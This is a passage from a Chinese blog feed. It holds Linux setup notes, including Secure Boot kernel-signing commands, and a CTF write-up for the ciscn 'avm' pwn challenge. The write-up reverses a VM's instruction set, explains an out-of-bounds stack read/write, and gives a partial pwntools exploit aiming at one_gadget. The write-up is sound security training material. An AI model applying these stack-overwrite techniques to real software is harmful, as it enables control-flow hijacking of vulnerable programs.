签署相关内容</span><br></pre></td></tr></table></figure><p>使用sbctl的好处是，其自带一个能够在内核更新后签署的pacmanhook，省事。</p><p>更多内容以及自己手动签名的细节操作，请参考ArchWiki的<a href="https://wiki.archlinuxcn.org/wiki/UEFI/%E5%AE%89%E5%85%A8%E5%90%AF%E5%8A%A8">安全启动</a>部分。</p><h1>一些关键的配置：</h1><h2 id="grub">grub</h2><p>/etc/default/grub<br>更改后使用grub-mkconfig重新生成引导</p><h2 id="sddm">sddm</h2><p>默认在/etc/sddm.conf.d目录下</p><h2 id="pacman">pacman</h2><p>镜像 /etc/pacman.d/mirrorlist<br>配置 /etc/pacman.conf</p><h2 id="zsh-bash">zsh/bash</h2><p>~/.bashrc或.zshrc</p><h2 id="其他">其他</h2><p>第三方应用：/opt<br>自定义相关：/usr/share<br>systemctl 命令<br>mount命令用-o指定挂载参数，-t指定分区，用df -h查看挂载情况，fdisk -l查看磁盘情况</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;首先的首先，最重要的参考来自于&lt;a href=&quot;https://arch.icekylin.online/guide/rookie/pre-install.html&quot;&gt;archlinux简明指南&lt;/a&gt;&lt;/strong&gt;。&lt;/p&gt;
&lt;h1&gt;写在前面&lt;/h1&gt;</summary>
      
    
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/categories/linux/"/>
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>linux杂谈（持续更新）</title>
    <link href="https://zjw1nd.github.io/2025/02/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://zjw1nd.github.io/2025/02/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2025-02-24T08:26:14.000Z</published>
    <updated>2025-02-24T08:32:26.881Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章可能都是什么也不懂的时候记录一些了解到的知识，kernel pwn也会放在linux这个类下，可能以后学了内核pwn会有不同的感受吧。</p><h2 id="2023-11-26-linux文件系统根目录下那些都是干什么的？">2023.11.26 linux文件系统根目录下那些都是干什么的？</h2><p>参考<a href="https://www.runoob.com/linux/linux-system-contents.html">菜鸟教程</a>的内容。简单谈点理解。<br>“文件是对字节流的抽象。”而linux也是一个有着“一切皆文件”思想的系统。而无论是什么样的linux发行版，基本根目录下都是那几个文件夹。简单了解下这个文件系统以及它根目录下那些文件夹名字的含义。类似Program Files这种吧。</p><p>草文件系统好复杂，不当了不当linux高手了.jpg</p><h2 id="2024-3-关于linux安装、内核升级、显卡驱动、内核签名等小总结">2024.3 关于linux安装、内核升级、显卡驱动、内核签名等小总结</h2><p>自己花200买了个固态u盘，装一手linux，打算搞成一个平常用的环境。同时windows下装了kali的wsl版本，顺带升级了win11专业版。</p><p>看中省事的集成图形化界面+中文社区装了deepin，这个过程很简单，按照官方教程（有集成好的应用程序），一件配置安装就好了。<br>踩坑主要是显示方面的问题，个人笔记本一直开启的独显直连，最早的显卡驱动无法调节亮度，deepin源apt安装的话报错和内核的驱动版本版本不符，而且仍然无法调节亮度。各种踩坑就跳过，总之解决过程是去英伟达官网下载对应型号的生产环境闭源驱动后安装（退出图形化界面然后直接找到文件执行），参考<a href="https://bbs.deepin.org/zh/post/232923?offset=0&amp;postId=1317417">这篇文章</a>。安装好之后开启显卡的亮度调节，跳过不能用的方法，参考的<a href="https://bbs.deepin.org.cn/zh/post/257837">这篇</a>，conf文件中开启<code>EnableBrightnessControl=1</code>，也是挺幽默的。</p><p>然后自己编译升级了一下内核（能解决笔记本合盖待机无法唤醒的问题），新就是好（错乱）。内核编译参考<a href="https://linux.cn/article-16252-1.html">这篇文章</a>，说的非常详细了。但是拯救者无法识别自带音响和麦克风的问题似乎被忘记了…看到内核6.3版本的时候有大佬说这个问题和主板有关系，提交内核patch被拒绝了说这个问题已经在解决，可惜目前还没有，参考<a href="https://bbs.deepin.org/post/249003">这篇</a>（没什么用）和<a href="https://github.com/xuwd1/lenovo-legion-slim7i-gen7-knowledges/wiki/%E8%A7%A3%E5%86%B3%E6%97%A0%E5%A4%96%E6%94%BE%E5%A3%B0%E9%9F%B3%E7%9A%84%E9%97%AE%E9%A2%98">这篇</a>文章。</p><blockquote><p>另外还能将自己的id加在内核后面，好玩。</p></blockquote><p>然后选择的最新的6.8.1内核。虽然是官方发布的内核但是没有发行版的签名，secure boot过不了，windows玩瓦那个b反作弊又要求开secure boot很烦，所以又要自己去签名内核。直接问了copilot加上自己搜索，执行以下几条命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -nodes -days 36500 -subj &quot;/CN=ZJ Secure Boot Signing Key/&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可能会要求输入密码，等下uefi启动会用</span></span><br><span class="line">sudo mokutil --import MOK.der</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里要先安装sbsign，apt就行 sudo apt install sbsigntool</span></span><br><span class="line">sudo sbsign --key MOK.priv --cert MOK.der --output /boot/vmlinuz-$(uname -r) /boot/vmlinuz-$(uname -r)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">报错了，问了copilot然后将证书改成.pem格式：</span></span><br><span class="line">openssl x509 -in MOK.der -inform DER -out MOK.pem -outform PEM</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新执行</span></span><br><span class="line">sudo sbsign --key MOK.priv --cert MOK.pem --output /boot/vmlinuz-$(uname -r) /boot/vmlinuz-$(uname -r)</span><br></pre></td></tr></table></figure><p>重启即可，这时候就可以打开secure boot了。从linux重启的时候会进入一个引导界面，选择enroll key然后输入密码即可。但是第一次启动gui界面直接花屏了，吓得我以为显卡驱动模块也要单独签名，结果再重启一次一切就正常了。这是一个没有任何关于密码学、证书、签名、非对称加密经验的人手动签名内核的经历。</p><h2 id="2024-6-2-Arch启动">2024.6.2 Arch启动</h2><p>deepinV20的glibc版本太低了很难受，先是重装了一个V23，但是效果不是很理想，不太喜欢V23的UI风格，而且流畅度还有缺陷。犹豫了一下加入Arch神教，好在现在已经有archinstall的脚本可以快速配置。不得不说KDE plasma就是漂亮——但是涉及显示问题就很多了。<br>外接屏幕不好用，显卡切换的问题，英伟达对wayland不支持…太史了。还是决定以后用这个系统就integrated模式算了，流畅度什么的也很高用着很舒服。还需要把安装的软件优化一下精简一下体积。毕竟都用arch了多少还是得洁癖一下。</p><p>彻底放弃英伟达，nouveau模块命名黑名单了没装，按照各种办法包括不从图形界面启动也调了但是没用，英伟达驱动开不了，应该是pacman的那个版本可能没法自动装载驱动，导致n卡默认驱动一直是nouveau但是我又禁用了它就一直没法输出。懒得搞了</p><p>2024.8不死心又搞了一次，mkinitcpio做内核镜像直接将nvidia挂载上，驱动是装上了显卡也能用（在xorg下）但是外接屏幕还是没用，运行一下nvidia-xconfig直接将图形化干没了，试了网上的解决方法都不行，最后直接删了xorg.conf然后配置sddm wayland启动 滚吧</p><h2 id="2025-2">2025.2</h2><p>最近课程设计比较轻松，重新搞这个arch，闲鱼花了20远程装了下，最后发现是nvidia的闭源驱动和内核版本强绑定，长时间没滚就寄了，装的时候还说我这依赖也烂。。。问题一堆但总算装上了，然而我自己折腾双显卡的时候，用了envycontrol，切换到集显一开机直接花屏了，livecd试着修了下也没办法，考虑到装的时候的那一堆问题，干脆推倒重来算了。</p><p>重装arch反而是最简单的，装好之后用btrfs文件系统回滚不要太爽，ext4吃屎去吧。重装之后直接pacman nvidia，有了前面踩坑的经验二周目速通了，配置内核参数似乎都不用就能开？</p><p>总之optimus manager也是搞上了，装好之后电源策略bbswitch一错直接回滚或者重装懒得bb。整理一个新的总集篇好吧</p><h2 id="shell脚本学习">shell脚本学习</h2><p>shell声明 <code>#! /bin/bash</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这篇文章可能都是什么也不懂的时候记录一些了解到的知识，kernel pwn也会放在linux这个类下，可能以后学了内核pwn会有不同的感受吧。&lt;/p&gt;
&lt;h2 id=&quot;2023-11-26-linux文件系统根目录下那些都是干什么的？&quot;&gt;2023.11.26 linux文件</summary>
      
    
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/categories/linux/"/>
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>IDA-Better_printk推广</title>
    <link href="https://zjw1nd.github.io/2025/02/20/IDA-Better-printk%E6%8E%A8%E5%B9%BF/"/>
    <id>https://zjw1nd.github.io/2025/02/20/IDA-Better-printk%E6%8E%A8%E5%B9%BF/</id>
    <published>2025-02-20T14:22:10.000Z</published>
    <updated>2025-02-21T08:08:27.614Z</updated>
    
    
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/categories/Develop/"/>
    
    
    <category term="逆向" scheme="https://zjw1nd.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="Develop" scheme="https://zjw1nd.github.io/tags/Develop/"/>
    
  </entry>
  
  <entry>
    <title>ciscn_ccb2025初赛-avm重做wp</title>
    <link href="https://zjw1nd.github.io/2025/02/20/ciscn-ccb2025%E5%88%9D%E8%B5%9B-avm%E9%87%8D%E5%81%9Awp/"/>
    <id>https://zjw1nd.github.io/2025/02/20/ciscn-ccb2025%E5%88%9D%E8%B5%9B-avm%E9%87%8D%E5%81%9Awp/</id>
    <published>2025-02-20T14:19:56.000Z</published>
    <updated>2025-02-21T08:01:11.163Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><h2 id="逆向虚拟机结构">逆向虚拟机结构</h2><p>这道题目的虚拟机还算规整，从main函数开始看，从对虚拟机初始化的函数入手并结合代码执行的函数可以看出，整体的vm结构放在了bss，包括32个通用寄存器，rip，代码指针和代码大小。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> vm *__fastcall <span class="title function_">initvm</span><span class="params">(<span class="keyword">struct</span> vm *mem, __int64 code, <span class="type">unsigned</span> __int64 size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  mem-&gt;CS_code_start = code;</span><br><span class="line">  mem-&gt;code_size = size;</span><br><span class="line">  result = mem;</span><br><span class="line">  mem-&gt;RIP = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = mem;</span><br><span class="line">    mem-&gt;regs[i] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虚拟机结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> // <span class="title">sizeof</span>=</span><span class="number">0x118</span></span><br><span class="line"><span class="number">00000000</span> &#123;                                       <span class="comment">// XREF: .bss:vm/r</span></span><br><span class="line"><span class="number">00000000</span>     __int64 regs[<span class="number">32</span>];</span><br><span class="line"><span class="number">00000100</span>     __int64 RIP;</span><br><span class="line"><span class="number">00000108</span>     __int64 CS_code_start;</span><br><span class="line"><span class="number">00000110</span>     <span class="type">unsigned</span> __int64 code_size;</span><br><span class="line"><span class="number">00000118</span> &#125;;</span><br></pre></td></tr></table></figure><h2 id="逆向指令集">逆向指令集</h2><p>这里复现的时候也头晕的不行，我们先看执行函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">execute</span><span class="params">(<span class="keyword">struct</span> vm *vm)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> insn; <span class="comment">// [rsp+1Ch] [rbp-114h]</span></span><br><span class="line">  _BYTE s[<span class="number">264</span>]; <span class="comment">// [rsp+20h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( vm-&gt;RIP &lt; vm-&gt;code_size )</span><br><span class="line">  &#123;</span><br><span class="line">    insn = *(_DWORD *)(vm-&gt;CS_code_start + (vm-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL)) &gt;&gt; <span class="number">28</span>;<span class="comment">// rip指针四字节对齐</span></span><br><span class="line">    <span class="keyword">if</span> ( insn &gt; <span class="number">0xA</span> || !insn )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Unsupported instruction&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="keyword">struct</span> vm *, _BYTE *))funcs_1AAD[insn])(vm, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，虚拟机指令最终的执行是借助一个vtable实现的。逐一分析vtable里的函数就能还原指令的功能，包括add,sub等常见运算与两个关键的访存指令指令包含三个操作数和一个操作码。最高4位是操作数，限制为0-10，用于下标直接从vtable中索引操作。而其余三个操作数对于运算指令来说，分为最低5位，次5位和高字的低5位（16-20）。用5位数0-31来在32个通用寄存器中索引操作，第一操作数为5-9，第二操作数位16-20，第三操作数（结果寄存器）为0-4.</p><blockquote><p>ps: 这里绕了我半天，每次看着看着就不记得哪个减哪个了，也不确定自己封装的对不对…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> vm *__fastcall <span class="title function_">sub</span><span class="params">(<span class="keyword">struct</span> vm *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = *(_DWORD *)(a1-&gt;CS_code_start + (a1-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL));</span><br><span class="line">  a1-&gt;RIP += <span class="number">4LL</span>;</span><br><span class="line">  result = a1;</span><br><span class="line">  a1-&gt;regs[v2 &amp; <span class="number">0x1F</span>] = a1-&gt;regs[(v2 &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] - a1-&gt;regs[HIWORD(v2) &amp; <span class="number">0x1F</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而两个访存指令则比较特别，对于load，其可以从一个指定地址加载8字节到一个通用寄存器。虚拟机运行指令时会在调用指令前的一个函数内分配一段空间并作为参数传入。这个指令也是三个操作数，不同的是会用一个寄存器做基地址，高字的低12位做偏移来针对a2做索引，然后结果放入结果寄存器。store则与其相反，参数规则一样，是将结果寄存器内容存入指定地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">load</span><span class="params">(<span class="keyword">struct</span> vm *vm, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v3; <span class="comment">// [rsp+1Eh] [rbp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cur_instruc; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  cur_instruc = *(_DWORD *)(vm-&gt;CS_code_start + (vm-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL));</span><br><span class="line">  vm-&gt;RIP += <span class="number">4LL</span>;</span><br><span class="line">  result = (<span class="type">void</span> *)(<span class="type">unsigned</span> __int8)byte_4010;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(vm-&gt;regs[(cur_instruc &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] + BYTE2(cur_instruc)) &lt; (<span class="type">unsigned</span> __int8)byte_4010 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = vm;</span><br><span class="line">    v3 = vm-&gt;regs[(cur_instruc &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] + (HIWORD(cur_instruc) &amp; <span class="number">0xFFF</span>);</span><br><span class="line">    vm-&gt;regs[cur_instruc &amp; <span class="number">0x1F</span>] = ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">7</span>] &lt;&lt; <span class="number">56</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">6</span>] &lt;&lt; <span class="number">48</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">5</span>] &lt;&lt; <span class="number">40</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">4</span>] &lt;&lt; <span class="number">32</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | *(<span class="type">unsigned</span> __int16 *)&amp;a2[v3];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>漏洞分析</h1><p>显然，访存指令的权限太大了。这个指令里的偏移能索引0xfff，也就是说我们能够在一个相当大范围的栈上任意读写。构造ROP或者直接ret2og都是可以的。不过这道题的难点是，他没有泄露，我们需要自己去凑libc地址，所以从栈上想办法找一个“好”的地址就成为了本题的关键。但比较恶心的是，可能由于aslr的存在，栈内部的偏移许多都是不固定的，因此这道题让我掌握了一个很宝贵的经验，也就是<strong>合理使用search+distance指令组合拳</strong>。</p><blockquote><p>另外有一个简单的点，由于0xfff实在太大了，我们可以load和store我们输入的code内容，也就是说基本是直球的栈上任意地址读写。</p></blockquote><h2 id="pwndbg好用捏">pwndbg好用捏</h2><p>pwndbg为我们提供了轮椅为什么不用？调试过程中会以返回地址形式显示函数调用堆栈，我们可以直接找最近的libc内地址，直接<code>search -t pointer</code>，然后<code>distance $rsi</code>，就能看到需要多少的偏移。找一个不变的即可，比stack之后肉眼观察强太多了。</p><h2 id="onegadget">onegadget</h2><p>这里og选取不是很容易，改完返回地址程序退出后rbp是0x1导致很多条件简单的og用不了，这个是直接从网上的wp copy的，实战过程中可以一个个试一试，指定<code>-l 1</code>之后其实也没有太多。</p><h1>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p32</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># 4字节指令</span></span><br><span class="line"><span class="comment"># 32位</span></span><br><span class="line"><span class="comment"># 高四位是操作码，从0-10对应10个指令</span></span><br><span class="line"><span class="comment"># 低5位是一个寄存器</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 4 7 5 | 6 5 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数全部都是寄存器编号</span></span><br><span class="line"><span class="comment"># a op b -&gt; c</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">op,a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> p32(((op &amp; <span class="number">0xF</span>)&lt;&lt;<span class="number">28</span>) + ((b &amp; <span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>) + ((a &amp; <span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>) + (c &amp; <span class="number">0x1f</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">1</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">2</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">3</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">4</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">5</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_and</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">6</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slr</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">7</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">8</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">base,offset,content</span>):</span><br><span class="line">    op = <span class="number">0x9</span> &lt;&lt; <span class="number">28</span></span><br><span class="line">    off = (offset &amp; <span class="number">0xFFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    cont = content &amp; <span class="number">0x1F</span></span><br><span class="line">    b = (base &amp; <span class="number">0x1f</span>) &lt;&lt; <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> p32(op + off + b + cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">base,offset,r</span>):</span><br><span class="line">    op = <span class="number">0xA</span> &lt;&lt; <span class="number">28</span></span><br><span class="line">    off = (offset &amp; <span class="number">0xFFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    target = r &amp; <span class="number">0x1F</span></span><br><span class="line">    b = (base &amp; <span class="number">0x1f</span>) &lt;&lt; <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> p32(op + off + b + target)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指令本身提供任意地址读写</span></span><br><span class="line"><span class="comment"># 因此需要找合适地址做写入，code就在栈上，偷地址出来然后试着改</span></span><br><span class="line"><span class="comment"># 一般这种题的思路都是先试og，不行再试试system</span></span><br><span class="line"><span class="comment"># 首先，先检查泄露，这道题没有任何输出内容，要泄露需要自己调puts，会很麻烦</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这道题的核心是要想办法在寄存器凑出一个关键的写入地址</span></span><br><span class="line"><span class="comment"># 他妈的我的脑子就是绕不过来这个指令</span></span><br><span class="line"><span class="comment"># 哦，原来是在执行访存指令时会额外传入一个栈上的地址做偏移，我们相当于可以在栈上一个地址偏移0x100范围内操作</span></span><br><span class="line"><span class="comment"># 可以从栈上找好的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># search -t dword 0xa1200001</span></span><br><span class="line"><span class="comment"># distance $rsi 